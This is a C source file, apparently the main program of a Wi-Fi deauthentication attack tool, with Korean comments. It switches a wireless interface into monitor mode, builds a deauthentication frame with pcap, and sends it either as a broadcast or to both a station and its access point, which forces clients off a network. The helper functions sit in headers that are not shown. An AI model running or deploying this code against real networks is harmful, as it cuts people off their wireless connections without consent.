#include <pcap.h>
#include "attack_frame.h" // 비콘프레임 관련
#include "utils.h" //파일 및 모니터모드 관련


int main(int argc, char *argv[])
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

    start_monitor_mode(argv[1]);

    int chosen = choose_deauth(argc, argv);

    handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
        return 2;
    }

    Deauthentication_Frame frame = {0};
    printf("%d\n", sizeof(Deauthentication_Frame));
    fill_frame(frame);

    switch(chosen)
    {
        case 1:
            return 0;

        case 2:
            send_deauth_broadcast(frame, handle, argv);
            return 0;

        case 3:
            send_deauth_to_bidirection(frame, handle, argv);
            return 0;

        case 4:
            return 0;

        case 5:
            return 0;
     }
}